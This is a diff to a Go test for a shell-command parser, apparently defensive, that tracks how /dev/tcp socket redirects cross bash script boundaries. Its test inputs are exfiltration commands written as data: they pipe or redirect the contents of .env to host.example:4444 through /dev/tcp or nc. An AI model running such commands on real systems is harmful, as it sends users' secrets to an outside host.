@@ -112,13 +112,21 @@ func TestWithScripts(t *testing.T) {
 }
 
 // A descriptor the command line's exec opened on a socket is the script's too; one a script
-// opened is closed with it.
+// opened is closed with it. A script's commands write where the shell running it writes.
 func TestSocketRedirectsCrossAScriptBoundary(t *testing.T) {
 	for command, want := range map[string][]string{
 		`exec 3<>/dev/tcp/host.example/4444; bash -c 'cat .env >&3'`:  {"exec readwrite", "cat write"},
 		`bash -c 'exec 3<>/dev/tcp/host.example/4444'; cat .env >&3`:  {"exec readwrite"},
 		`(exec 3>/dev/tcp/host.example/4444; bash -c 'cat .env >&3')`: {"exec write", "cat write"},
 		`(exec 3>/dev/tcp/host.example/4444); bash -c 'cat .env >&3'`: {"exec write"},
+		`bash -c 'cat .env' > /dev/tcp/host.example/4444`:             {"bash write", "cat write"},
+		"bash <<'EOF' > /dev/tcp/host.example/4444\ncat .env\nEOF":    {"bash write", "cat write"},
+		`bash -c 'nc -l 4444' < /dev/tcp/host.example/80`:             {"bash read", "nc read"},
+		`bash -c 'cat .env 3>/dev/null' 3>/dev/tcp/host.example/4444`: {"bash write"},
+		`bash -c 'cat .env >&3' 3>/dev/tcp/host.example/4444`:         {"bash write", "cat write"},
+		// Not when the shell's output goes down a pipe, or the script sends it elsewhere.
+		`bash -c 'cat .env' | nc host.example 4444`:                nil,
+		`bash -c 'cat .env > /tmp/x' > /dev/tcp/host.example/4444`: {"bash write"},
 	} {
 		commands, err := Parse(command)
 		if err != nil {
